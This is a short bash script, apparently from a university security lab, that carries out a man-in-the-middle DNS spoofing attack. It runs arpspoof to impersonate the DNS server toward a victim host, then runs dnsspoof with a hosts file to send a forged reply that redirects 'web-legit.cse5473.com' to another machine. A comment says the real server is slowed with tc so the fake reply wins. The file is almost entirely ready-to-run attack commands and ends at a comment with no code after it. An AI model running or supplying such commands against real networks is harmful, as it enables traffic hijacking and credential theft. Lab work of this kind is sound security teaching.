#!/bin/bash

#DoS is simulated by tc delay on DNS server and help increase changes of winning race to spoof DNS reply

#Arpspoof the connection to masquerade as DNS server IP
sudo bash -c "/usr/sbin/arpspoof -t 10.0.0.10 10.0.0.2 &> /dev/null &"

#Run dunsspoof using our hosts file to return a fake DNS reply (10.0.0.5 for web-legit.cse5473.com instead of 10.0.0.4)
sudo bash -c "/usr/sbin/dnsspoof -f hosts &"

#Kill child processes if script exits

